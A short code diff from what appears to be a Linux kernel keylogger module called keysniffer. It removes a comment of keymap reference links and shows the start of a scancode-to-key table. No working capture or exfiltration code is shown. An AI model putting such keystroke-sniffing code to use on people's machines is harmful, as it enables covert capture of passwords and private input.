@@ -25,11 +25,7 @@ static int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void
 // variables
 // *********************************************************************
 
-/*
- * Keymap references:
- * https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
- * http://www.quadibloc.com/comp/scan.htm
- */
+
 static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
